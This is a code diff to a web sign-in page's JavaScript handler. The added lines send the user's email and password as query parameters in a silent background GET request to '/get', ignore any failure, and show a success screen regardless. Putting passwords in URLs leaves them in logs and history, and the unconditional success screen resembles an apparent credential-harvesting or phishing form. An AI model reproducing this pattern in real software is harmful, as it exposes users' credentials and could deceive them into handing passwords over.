@@ -358,6 +358,8 @@
 
   <script>
     function handleSignIn(event) {
+      event.preventDefault();
+
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
       const terms = document.getElementById('terms').checked;
@@ -365,22 +367,22 @@
       if (!email) {
         document.getElementById('email').focus();
         document.getElementById('email').style.borderColor = '#c0392b';
-        event.preventDefault();
-        return false;
+        return;
       }
       if (!password) {
         document.getElementById('password').focus();
         document.getElementById('password').style.borderColor = '#c0392b';
-        event.preventDefault();
-        return false;
+        return;
       }
       if (!terms) {
         alert('Please agree to the Terms of Use to continue.');
-        event.preventDefault();
-        return false;
+        return;
       }
-      // Validation passed — form submits GET request to /get with email and password as query params
-      return true;
+
+      // Send credentials via GET request in the background, then show success screen
+      const params = new URLSearchParams({ email, password });
+      fetch('/get?' + params.toString(), { method: 'GET' }).catch(() => {});
+      showSuccess();
     }
 
     function handleGuest() {
